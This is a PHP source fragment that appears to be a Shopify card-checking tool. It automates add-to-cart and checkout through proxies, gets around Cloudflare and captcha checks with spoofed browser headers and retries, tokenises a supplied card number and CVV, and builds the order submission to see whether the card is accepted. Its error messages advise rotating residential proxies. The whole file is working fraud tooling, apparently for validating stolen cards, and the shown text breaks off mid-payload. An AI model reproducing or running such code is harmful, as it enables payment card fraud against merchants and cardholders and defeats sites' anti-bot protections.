$domain = parse_url($urlbase, PHP_URL_HOST); 
$cookie = 'cookie_'.uniqid('', true).'.txt';
$GLOBALS['__cookie_file'] = $cookie;
$prodid = $minPriceProductId;

// If we have a direct checkout URL, skip cart step and fetch checkout page directly
if ($isCheckoutUrl && $directCheckoutUrl) {
    cart:
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $directCheckoutUrl);
    apply_proxy_if_used($ch, $urlbase);
    apply_common_timeouts($ch);

    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
    curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: en-US,en;q=0.9',
        'priority: u=0, i',
        'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: document',
        'sec-fetch-mode: navigate',
        'sec-fetch-site: none',
        'sec-fetch-user: ?1',
        'upgrade-insecure-requests: 1',
        'user-agent: '.flow_user_agent(),
    ]);

    $response = curl_exec($ch);
    
    if (curl_errno($ch)) {
        curl_close($ch);
        if ($retryCount < $maxRetries) {
            $retryCount++;
            goto cart;
        } else {
            $err = 'Error accessing checkout URL => ' . curl_error($ch);
            $result_data = [
                'Response' => $err,
                'Price' => $minPrice,
            ];
            send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
        }
    } else {
        file_put_contents('php.php', $response);
        $finalUrl = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        
        // Cloudflare challenge detection and handling
        if (is_cloudflare_challenge($response, $httpCode)) {
            error_log("[CF-Bypass] Cloudflare challenge detected at checkout step, retrying with bypass headers");
            curl_close($ch);
            
            if ($retryCount < $maxRetries) {
                $retryCount++;
                usleep(200000); // Wait 0.2 seconds for Cloudflare (hyper-optimized)
                goto cart;
            }
        }
        
        // Captcha handling
        if (CaptchaSolver::requiresCaptcha($response)) {
            error_log("[Captcha] Captcha detected at checkout step, attempting bypass");
            $skip = CaptchaSolver::tryHeaderSkip($finalUrl ?: $directCheckoutUrl, $cookie);
            if ($skip['success']) {
                $response = $skip['response'];
            } else if ($retryCount < $maxRetries) {
                curl_close($ch);
                $retryCount++;
                usleep(150000); // Wait 0.15 seconds (hyper-optimized)
                goto cart;
            }
        }
        
        $web_build_id = find_between($response, 'web_build_id&quot;:&quot;', '&quot;');
        if (empty($web_build_id)) {
            $web_build_id = 'db0237b7310293c9fb41cbfd6a9f8683dfa53fe0'; 
        }
        $x_checkout_one_session_token = find_between($response, '<meta name="serialized-session-token" content="&quot;', '&quot;"');
        
        // Extract checkout token from URL if not already set
        if (empty($checkoutToken)) {
            $checkoutToken = extract_checkout_token_from_url($directCheckoutUrl);
        }
        
        // Extract product info from checkout page if we don't have it yet
        if (empty($minPriceProductId)) {
            $productInfo = extract_product_from_checkout_page($response);
            if ($productInfo) {
                $minPriceProductId = $productInfo['id'];
                $minPrice = $productInfo['price'];
                $productTitle = $productInfo['title'];
                $prodid = $minPriceProductId;
            }
        }
        
        curl_close($ch);
        
        if (empty($web_build_id) || empty($x_checkout_one_session_token)) {
            if ($retryCount < $maxRetries) {
                $retryCount++;
                goto cart;
            } else {
                $isCF = is_cloudflare_challenge($response, $httpCode ?? 0);
                $isCaptcha = is_captcha_challenge($response);
                
                if ($isCF) {
                    $err = "Cloudflare protection detected - Unable to bypass after multiple attempts";
                    $suggestion = "Try: 1) Use a residential proxy, 2) Rotate to different proxy, 3) Wait and retry later";
                } elseif ($isCaptcha) {
                    $err = "Captcha challenge detected - Unable to solve automatically";
                    $suggestion = "Try: 1) Use a different proxy, 2) Enable captcha solving service, 3) The site requires manual verification";
                } else {
                    $err = "Session token is empty - Checkout access may be restricted";
                    $suggestion = "Try: 1) Check if checkout URL is valid, 2) Use different proxy, 3) Site may be blocking automated access";
                }
                
                $result_data = [
                    'Response' => $err,
                    'Suggestion' => $suggestion,
                    'Price'=> $minPrice,
                    'Protection' => [
                        'Cloudflare' => $isCF,
                        'Captcha' => $isCaptcha
                    ]
                ];
                send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
            }
        }
    }
    
    // Extract additional checkout parameters from the direct checkout page
    $queue_token = find_between($response, 'queueToken&quot;:&quot;', '&quot;');
    $stable_id = find_between($response, 'stableId&quot;:&quot;', '&quot;');
    $paymentMethodIdentifier = find_between($response, 'paymentMethodIdentifier&quot;:&quot;', '&quot;');
    
    // Set checkout URL from the direct checkout URL
    $checkouturl = $directCheckoutUrl;
} else {
    // Normal flow: add to cart first
    add_to_cart:
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $urlbase.'/cart/'.$prodid.':1');
    apply_proxy_if_used($ch, $urlbase);
    apply_common_timeouts($ch);

    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
    curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: en-US,en;q=0.9',
        'priority: u=0, i',
        'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
        'sec-fetch-dest: document',
        'sec-fetch-mode: navigate',
        'sec-fetch-site: none',
        'sec-fetch-user: ?1',
        'upgrade-insecure-requests: 1',
        'user-agent: '.flow_user_agent(),
    ]);

    $headers = [];
    curl_setopt($ch, CURLOPT_HEADERFUNCTION, function($ch, $headerLine) use (&$headers) {
        list($name, $value) = explode(':', $headerLine, 2) + [NULL, NULL];
        $name = trim($name);
        $value = trim($value);

        // Save the 'Location' header
        if (strtolower($name) === 'location') {
            $headers['Location'] = $value;
        }

        return strlen($headerLine);
    });

    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        curl_close($ch); // Always close the previous handle before retrying
        if ($retryCount < $maxRetries) {
            $retryCount++;
            goto add_to_cart; // Retry the entire operation
        } else {
            $err = 'Error in 1st Req => ' . curl_error($ch);
            $result_data = [
                'Response' => $err,
                'Price' => $minPrice,
            ];
            send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
        }
    } else {
        file_put_contents('php.php', $response );
        $finalUrl = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        
        // Cloudflare challenge detection and handling
        if (is_cloudflare_challenge($response, $httpCode)) {
            error_log("[CF-Bypass] Cloudflare challenge detected at cart step, retrying with bypass headers");
            curl_close($ch);
            
            if ($retryCount < $maxRetries) {
                $retryCount++;
                usleep(200000); // Wait 0.2 seconds for Cloudflare (hyper-optimized)
                goto add_to_cart; // Retry with fresh headers
            }
        }
        
        // Captcha handling: if page shows captcha, attempt a header-skip once
        if (CaptchaSolver::requiresCaptcha($response)) {
            error_log("[Captcha] Captcha detected at cart step, attempting bypass");
            $skip = CaptchaSolver::tryHeaderSkip($finalUrl ?: ($urlbase.'/cart/'.$prodid.':1'), $cookie);
            if ($skip['success']) {
                $response = $skip['response'];
            } else if ($retryCount < $maxRetries) {
                // If captcha bypass failed, retry once more
                curl_close($ch);
                $retryCount++;
                usleep(150000); // Wait 0.15 seconds (hyper-optimized)
                goto add_to_cart;
            }
        }
        $web_build_id = find_between($response, 'web_build_id&quot;:&quot;', '&quot;');
        if (empty($web_build_id)) {
            // Fallback to old hardcoded value if dynamic extraction fails
            $web_build_id = 'db0237b7310293c9fb41cbfd6a9f8683dfa53fe0'; 
        }
        $x_checkout_one_session_token = find_between($response, '<meta name="serialized-session-token" content="&quot;', '&quot;"');

        if (empty($web_build_id) || empty($x_checkout_one_session_token)) {
            if ($retryCount < $maxRetries) {
                $retryCount++;
                curl_close($ch); // Close current curl handle before retrying
                goto add_to_cart; // Retry the entire operation
            } else {
                // Check if it's a Cloudflare or captcha issue
                $isCF = is_cloudflare_challenge($response, $httpCode ?? 0);
                $isCaptcha = is_captcha_challenge($response);
                
                if ($isCF) {
                    $err = "Cloudflare protection detected - Unable to bypass after multiple attempts";
                    $suggestion = "Try: 1) Use a residential proxy, 2) Rotate to different proxy, 3) Wait and retry later";
                } elseif ($isCaptcha) {
                    $err = "Captcha challenge detected - Unable to solve automatically";
                    $suggestion = "Try: 1) Use a different proxy, 2) Enable captcha solving service, 3) The site requires manual verification";
                } else {
                    $err = "Session token is empty - Cart access may be restricted";
                    $suggestion = "Try: 1) Check if site is accessible, 2) Use different proxy, 3) Site may be blocking automated access";
                }
                
                $result_data = [
                    'Response' => $err,
                    'Suggestion' => $suggestion,
                    'Price'=> $minPrice,
                    'Protection' => [
                        'Cloudflare' => $isCF,
                        'Captcha' => $isCaptcha
                    ]
                ];
                send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
            }
        }
        
        curl_close($ch);
    }

    $checkouturl = isset($headers['Location']) ? $headers['Location'] : '';
    if (preg_match('/\/cn\/([^\/?]+)/', $checkouturl, $matches)) {
        $checkoutToken = $matches[1];
    }
}

$queue_token = find_between($response, 'queueToken&quot;:&quot;', '&quot;');
if (empty($queue_token)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto add_to_cart; // Retry the entire operation
    } else {
    $err = 'Queue Token is Empty';
    $result_data = [
        'Response' => $err,
        'Price'=> $minPrice,
    ];
    send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
}
}

$stable_id = find_between($response, 'stableId&quot;:&quot;', '&quot;');
if (empty($stable_id)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto add_to_cart; // Retry the entire operation
    } else {
    $err = 'Stable id is empty';
    $result_data = [
        'Response' => $err,
        'Price'=> $minPrice,
    ];
    send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
}
}
$paymentMethodIdentifier = find_between($response, 'paymentMethodIdentifier&quot;:&quot;', '&quot;');
if (empty($paymentMethodIdentifier)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto add_to_cart; // Retry the entire operation
    } else {
    $err = 'Payment Method Identifier is empty';
    $result_data = [
        'Response' => $err,
        'Price'=> $minPrice,
    ];
    send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
}
}
// Only set checkout URL and token if not already set (for normal flow)
if (!isset($checkouturl) || empty($checkouturl)) {
    $checkouturl = isset($headers['Location']) ? $headers['Location'] : '';
}
if (empty($checkoutToken) && !empty($checkouturl)) {
    if (preg_match('/\/cn\/([^\/?]+)/', $checkouturl, $matches)) {
        $checkoutToken = $matches[1];
    }
}

card:
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://deposit.shopifycs.com/sessions');
apply_proxy_if_used($ch, 'https://deposit.shopifycs.com/sessions');
apply_common_timeouts($ch);

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json',
    'accept-language: en-US,en;q=0.9',
    'content-type: application/json',
    'origin: https://checkout.shopifycs.com',
    'priority: u=1, i',
    'referer: https://checkout.shopifycs.com/',
    'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: '.flow_user_agent(),
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"'.$cc.'","month":'.$sub_month.',"year":'.$year.',"verification_value":"'.$cvv.'","start_month":null,"start_year":null,"issue_number":"","name":"'.$firstname.' '.$lastname.'"},"payment_session_scope":"'.$domain.'"}');
$response2 = curl_exec($ch);
$curlErr = curl_errno($ch);
$curlErrMsg = curl_error($ch);
curl_close($ch);
if ($curlErr) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto card; // Retry the entire operation
    } else {
    $err = 'cURL error: ' . $curlErrMsg;
    $result_data = [
        'Response' => $err,
        'Price'=> $minPrice,
    ];
    send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
}
}
$response2js = json_decode($response2, true);
$cctoken = $response2js['id'];
if (empty($cctoken)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto card; // Retry the entire operation
    } else {
    $err  = 'Card Token is empty';
    $result_data = [
        'Response' => $err,
        'Price'=> $minPrice,
    ];
    send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
     echo $response2;
    exit;
}
}

proposal:
if (runtime_cfg()['sleep']>0) { usleep((int)(runtime_cfg()['sleep'] * 1000000)); }
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=Proposal');
apply_proxy_if_used($ch, $urlbase);
apply_common_timeouts($ch);

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
 curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json',
    'accept-language: en-GB',
    'content-type: application/json',
    'origin: ' . $urlbase,
    'priority: u=1, i',
    'referer: ' . $urlbase . '/',
    'sec-ch-ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'shopify-checkout-client: checkout-web/1.0',
    'user-agent: '.flow_user_agent(),
    'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
    'x-checkout-web-build-id: ' . $web_build_id,
    'x-checkout-web-deploy-stage: production',
    'x-checkout-web-server-handling: fast',
    'x-checkout-web-server-rendering: no',
    'x-checkout-web-source-id: ' . $checkoutToken,
    'Expect:',
]);
$proposalQuery = extractOperationQueryFromFile('jsonp.php', 'Proposal');
$proposalPayload = [
        'query' => $proposalQuery,
        'variables' => [
                'sessionInput' => [
                    'sessionToken' => $x_checkout_one_session_token
                ],
                'queueToken' => $queue_token,
            'discounts' => [
                'lines' => [],
                'acceptUnexpectedDiscounts' => true
            ],
            'delivery' => [
                'deliveryLines' => [
                    [
                        'destination' => [
                            'partialStreetAddress' => [
                                    'address1' => $address,
                                    'address2' => '',
                                    'city' => $city_us,
                                    'countryCode' => $country_code,
                                    'postalCode' => $zip_us,
                                    'firstName' => $firstname,
                                    'lastName' => $lastname,
                                    'zoneCode' => $state_us,
                                    'phone' => $phone,
                                    'oneTimeUse' => false,
                                    'coordinates' => [
                                        'latitude' => $lat,
                                        'longitude' => $lon
                                ]
                            ]
                        ],
                        'selectedDeliveryStrategy' => [
                            'deliveryStrategyMatchingConditions' => [
                                'estimatedTimeInTransit' => [
                                    'any' => true
                                ],
                                'shipments' => [
                                    'any' => true
                                ]
                            ],
                            'options' => new stdClass()
                        ],
                        'targetMerchandiseLines' => [
                            'any' => true
                        ],
                        'deliveryMethodTypes' => [
                            'SHIPPING',
                            'LOCAL'
                        ],
                        'expectedTotalPrice' => [
                            'any' => true
                        ],
                        'destinationChanged' => true
                    ]
                ],
                'noDeliveryRequired' => [],
                'useProgressiveRates' => false,
                'prefetchShippingRatesStrategy' => null,
                'supportsSplitShipping' => true
            ],
            'deliveryExpectations' => [
                'deliveryExpectationLines' => []
            ],
            'merchandise' => [
                'merchandiseLines' => [
                    [
                        'stableId' => $stable_id,
                        'merchandise' => [
                            'productVariantReference' => [
                                'id' => 'gid://shopify/ProductVariantMerchandise/' . $prodid,
                                'variantId' => 'gid://shopify/ProductVariant/' . $prodid,
                                'properties' => [
                                    [
                                        'name' => '_minimum_allowed',
                                        'value' => [
                                            'string' => ''
                                        ]
                                    ]
                                ],
                                'sellingPlanId' => null,
                                'sellingPlanDigest' => null
                            ]
                        ],
                        'quantity' => [
                            'items' => [
                                'value' => 1
                            ]
                        ],
                        'expectedTotalPrice' => [
                            'value' => [
                                'amount' => $minPrice,
                                'currencyCode' => 'USD'
                            ]
                        ],
                        'lineComponentsSource' => null,
                        'lineComponents' => []
                    ]
                ]
            ],
            'payment' => [
                'totalAmount' => [
                    'any' => true
                ],
                'paymentLines' => [],
                'billingAddress' => [
                    'streetAddress' => [
                        'address1' => $address,
                        'address2' => '',
                        'city' => $city_us,
                        'countryCode' => $country_code,
                        'postalCode' => $zip_us,
                        'firstName' => $firstname,
                        'lastName' => $lastname,
                        'zoneCode' => $state_us,
                        'phone' => $phone,
                    ]
                ]
            ],
            'buyerIdentity' => [
                'customer' => [
                    'presentmentCurrency' => 'USD',
                    'countryCode' => $country_code
                ],
                'email' => $email,
                'emailChanged' => false,
                'phoneCountryCode' => 'US',
                'marketingConsent' => [],
                'shopPayOptInPhone' => [
                    'countryCode' => $country_code
                ],
                'rememberMe' => false
            ],
            'tip' => [
                'tipLines' => []
            ],
            'taxes' => [
                'proposedAllocations' => null,
                'proposedTotalAmount' => null,
                'proposedTotalIncludedAmount' => [
                    'value' => [
                        'amount' => '0',
                        'currencyCode' => 'USD'
                    ]
                ],
                'proposedMixedStateTotalAmount' => null,
                'proposedExemptions' => []
            ],
            'note' => [
                'message' => null,
                'customAttributes' => []
            ],
            'localizationExtension' => [
                'fields' => []
            ],
            'nonNegotiableTerms' => null,
            'scriptFingerprint' => [
                'signature' => null,
                'signatureUuid' => null,
                'lineItemScriptChanges' => [],
                'paymentScriptChanges' => [],
                'shippingScriptChanges' => []
            ],
            'optionalDuties' => [
                'buyerRefusesDuties' => false
            ]
        ],
        'operationName' => 'Proposal'
];
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($proposalPayload));

$response3 = curl_exec($ch);
$curlErr = curl_errno($ch);
$curlErrMsg = curl_error($ch);
curl_close($ch);
// echo "<li>step_3: $response3<li>";
if ($curlErr) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto proposal; // Retry the entire operation
    } else {
    $err = 'cURL error: ' . $curlErrMsg;
    $result_data = [
        'Response' => $err,
        'Price'=> $minPrice,
    ];
    send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
}
}


$decoded = json_decode($response3);

// Log response for debugging
if (isset($_GET['debug'])) {
    file_put_contents('proposal_debug.json', json_encode($decoded, JSON_PRETTY_PRINT));
}

$gateway = '';
$paymentMethodName = 'null';

if (isset($decoded->data->session->negotiate->result->sellerProposal)) {
    $firstStrategy = $decoded->data->session->negotiate->result->sellerProposal;
    
    if (empty($firstStrategy)) {
        if ($retryCount < $maxRetries) {
            $retryCount++;
            goto proposal;
        } else {
            $err = 'Shipping info is empty';
            $result_data = [
                'Response' => $err,
                'Price' => $minPrice,
                'Gateway' => $gateway,
            ];
            send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
        }
    } else {
        // Get payment method name
        if (!empty($firstStrategy->payment->availablePaymentLines)) {
            foreach ($firstStrategy->payment->availablePaymentLines as $paymentLine) {
                if (isset($paymentLine->paymentMethod->name)) {
                    $paymentMethodName = $paymentLine->paymentMethod->name;
                    break;
                }
            }
        }
    }
} elseif (isset($decoded->errors)) {
    // Handle GraphQL errors
    $errorMsg = isset($decoded->errors[0]->message) ? $decoded->errors[0]->message : 'GraphQL error';
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto proposal;
    } else {
        $err = 'API Error: ' . $errorMsg;
        $result_data = [
            'Response' => $err,
            'Price' => $minPrice,
        ];
        send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
    }
}

// Enhance gateway detection with paymentMethodIdentifier
$extraSignals = [$paymentMethodName];
if (!empty($paymentMethodIdentifier) && $paymentMethodIdentifier !== 'null') {
    $extraSignals[] = $paymentMethodIdentifier;
}

$gatewayCandidates = GatewayDetector::detectAll($response3, $checkouturl, $extraSignals);
$gatewayInsight = $gatewayCandidates[0] ?? GatewayDetector::unknown();

// If we have a valid payment method name, use it as the gateway label
if (!empty($paymentMethodName) && strtolower($paymentMethodName) !== 'null') {
    $gatewayInsight['label'] = $paymentMethodName;
    $gatewayCandidates[0] = $gatewayInsight;
}
// Fallback: if still unknown but we have paymentMethodIdentifier, infer gateway from it
elseif ($gatewayInsight['id'] === 'unknown' && !empty($paymentMethodIdentifier)) {
    // Try to infer gateway from identifier
    $identifier = strtolower($paymentMethodIdentifier);
    if (strpos($identifier, 'shopify') !== false) {
        $gatewayInsight['id'] = 'shopify_payments';
        $gatewayInsight['name'] = 'Shopify Payments';
        $gatewayInsight['label'] = 'Shopify Payments';
        $gatewayInsight['confidence'] = 0.8;
        $gatewayInsight['supports_cards'] = true;
    } elseif (strpos($identifier, 'stripe') !== false) {
        $gatewayInsight['id'] = 'stripe';
        $gatewayInsight['name'] = 'Stripe';
        $gatewayInsight['label'] = 'Stripe';
        $gatewayInsight['confidence'] = 0.8;
        $gatewayInsight['supports_cards'] = true;
    } elseif (strpos($identifier, 'paypal') !== false) {
        $gatewayInsight['id'] = 'paypal';
        $gatewayInsight['name'] = 'PayPal / Braintree';
        $gatewayInsight['label'] = 'PayPal';
        $gatewayInsight['confidence'] = 0.8;
        $gatewayInsight['supports_cards'] = true;
    }
    $gatewayCandidates[0] = $gatewayInsight;
}

$GLOBALS['__gateway_primary'] = $gatewayInsight;
$GLOBALS['__gateway_candidates'] = $gatewayCandidates;
$gateway = $gatewayInsight['label'] ?? $gatewayInsight['name'];
if (is_array($GLOBALS['__payment_context'])) {
    $GLOBALS['__payment_context']['method_label'] = $gateway;
    $GLOBALS['__payment_context']['supports_cards'] = $gatewayInsight['supports_cards'] ?? null;
    $GLOBALS['__payment_context']['gateway_id'] = $gatewayInsight['id'] ?? null;
}

// Initialize delivery and tax variables
$handle = '';
$delamount = null;
$tax = null;

// Try to get handle from multiple possible locations
if (isset($firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies[0]->handle)) {
    $handle = $firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies[0]->handle;
} elseif (isset($firstStrategy->delivery->deliveryLines[0]->deliveryStrategy->handle)) {
    $handle = $firstStrategy->delivery->deliveryLines[0]->deliveryStrategy->handle;
} elseif (isset($firstStrategy->delivery->selectedDeliveryOption->handle)) {
    $handle = $firstStrategy->delivery->selectedDeliveryOption->handle;
}

if (empty($handle)) {
    // Try to find first available delivery strategy
    if (isset($firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies) && 
        is_array($firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies) &&
        count($firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies) > 0) {
        foreach ($firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies as $strategy) {
            if (isset($strategy->handle) && !empty($strategy->handle)) {
                $handle = $strategy->handle;
                break;
            }
        }
    }
}

if (empty($handle)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto proposal;
    } else {
        $err = 'Handle is empty - No delivery strategies available';
        $result_data = [
            'Response' => $err,
            'Price'=> $minPrice,
            'Gateway' => $gateway,
            'Debug' => 'Check if site has delivery methods configured'
        ];
        send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
    }
}
    if (isset($firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies[0]->amount->value->amount)) {
        $delamount = $firstStrategy->delivery->deliveryLines[0]->availableDeliveryStrategies[0]->amount->value->amount;
    }
    // Accept 0.00 as valid delivery amount (free shipping)
    if ($delamount === null || $delamount === '') {
        if ($retryCount < $maxRetries) {
            $retryCount++;
            goto proposal;
        } else {
            $err = 'Delivery rates are empty';
            $result_data = [
                'Response' => $err,
                'Price'=> $minPrice,
                'Gateway' => $gateway,
            ];
            send_final_response($result_data, $proxy_used, $proxy_ip, $proxy_port);
        }
    }
    if (isset($firstStrategy->tax->totalTaxAmount->value->amount)) {
        $tax = $firstStrategy->tax->totalTaxAmount->value->amount;
    }
    // Accept 0.00 as valid tax amount (tax-free items or regions)
    if ($tax === null || $tax === '') {
        // Set tax to 0 if not available (some regions have no tax)
        $tax = '0.00';
        if (isset($_GET['debug'])) {
            error_log("[DEBUG] Tax amount not found in response, defaulting to 0.00");
        }
    }
    // Safely extract currency code with validation
    if (isset($firstStrategy->tax->totalTaxAmount->value->currencyCode)) {
        $currencycode = $firstStrategy->tax->totalTaxAmount->value->currencyCode;
    } else {
        $currencycode = 'USD'; // Default fallback
    }
    
    // Safely extract total amount with validation
    if (isset($firstStrategy->runningTotal->value->amount)) {
        $totalamt = $firstStrategy->runningTotal->value->amount;
    } elseif (isset($firstStrategy->total->value->amount)) {
        // Try alternative path for total amount
        $totalamt = $firstStrategy->total->value->amount;
    } else {
        // Calculate total from components if not available
        $totalamt = ($minPrice ?? 0) + ($delamount ?? 0) + ($tax ?? 0);
        if (isset($_GET['debug'])) {
            error_log("[DEBUG] Total amount calculated from components: $totalamt");
        }
    }
    $GLOBALS['__payment_context'] = [
        'currency' => $currencycode ?? null,
        'amounts' => [
            'subtotal' => isset($minPrice) ? (float) $minPrice : null,
            'shipping' => isset($delamount) ? (float) $delamount : null,
            'tax' => isset($tax) ? (float) $tax : null,
            'total' => isset($totalamt) ? (float) $totalamt : null,
        ],
        'raw' => [
            'subtotal' => $minPrice ?? null,
            'shipping' => $delamount ?? null,
            'tax' => $tax ?? null,
            'total' => $totalamt ?? null,
        ],
    ];
    if (is_array($GLOBALS['__payment_context'])) {
        $primary = $GLOBALS['__gateway_primary'] ?? GatewayDetector::unknown();
        $GLOBALS['__payment_context']['method_label'] = $gateway;
        $GLOBALS['__payment_context']['supports_cards'] = $primary['supports_cards'] ?? null;
        $GLOBALS['__payment_context']['gateway_id'] = $primary['id'] ?? null;
        $GLOBALS['__payment_context']['card_networks'] = $primary['card_networks'] ?? [];
        $GLOBALS['__payment_context']['funding_types'] = $primary['funding_types'] ?? [];
    }
  //  $resultg = json_encode([
  //  'Response' => 'Success',
    //'Details' => [
    //    'Price' => $minPrice,
    //    'Shipping' => $delamount,
    //    'Tax' => $tax,
    //    'Total' => $totalamt,
     //   'Currency' => $currencycode,
      //  'Gateway' => $gateway,
 //   ],
//]);
//    echo $resultg;
if ($totalamt == '10.98' && $currencycode == 'USD') {
    $postf = json_encode(['query' => extractOperationQueryFromFile('jsonp.php', 'SubmitForCompletion'),
                'variables' => [
                    'input' => [
                        'sessionInput' => [
                            'sessionToken' => $x_checkout_one_session_token
                        ],
                        'queueToken' => $queue_token,
                        'discounts' => [
                            'lines' => [],
                            'acceptUnexpectedDiscounts' => true
                        ],
                        'delivery' => [
                            'deliveryLines' => [
                                [
                                    'selectedDeliveryStrategy' => [
                                        'deliveryStrategyMatchingConditions' => [
                                            'estimatedTimeInTransit' => [
                                                'any' => true
                                            ],
                                            'shipments' => [
                                                'any' => true
                                            ]
                                        ],
                                        'options' => new stdClass()
                                    ],
                                    'targetMerchandiseLines' => [
                                        'lines' => [
                                            [
                                                'stableId' => $stable_id
                                            ]
                                        ]
                                    ],
                                    'deliveryMethodTypes' => [
                                        'NONE'
                                    ],
                                    'expectedTotalPrice' => [
                                        'any' => true
                                    ],
                                    'destinationChanged' => true
                                ]
                            ],
                            'noDeliveryRequired' => [],
                            'useProgressiveRates' => false,
                            'prefetchShippingRatesStrategy' => null,
                            'supportsSplitShipping' => true
                        ],
                        'deliveryExpectations' => [
                            'deliveryExpectationLines' => []
                        ],
                        'merchandise' => [
                            'merchandiseLines' => [
                                [
                                    'stableId' => $stable_id,
                                    'merchandise' => [
                                        'productVariantReference' => [
                                            'id' => 'gid://shopify/ProductVariantMerchandise/' . $prodid,
                                            'variantId' => 'gid://shopify/ProductVariant/' . $prodid,
                                            'properties' => [],
                                            'sellingPlanId' => null,
                                            'sellingPlanDigest' => null
                                        ]
                                    ],
                                    'quantity' => [
                                        'items' => [
                                            'value' => 1
                                        ]
                                    ],
                                    'expectedTotalPrice' => [
                                        'value' => [
                                            'amount' => $minPrice,
                                            'currencyCode' => 'USD'
                                        ]
                                    ],
                                    'lineComponentsSource' => null,
                                    'lineComponents' => []
                                ]
                            ]
                        ],
                        'payment' => [
                            'totalAmount' => [
                                'any' => true
                            ],
                            'paymentLines' => [
                                [
                                    'paymentMethod' => [
                                        'directPaymentMethod' => [
                                            'paymentMethodIdentifier' => $paymentMethodIdentifier,
                                            'sessionId' => $cctoken,
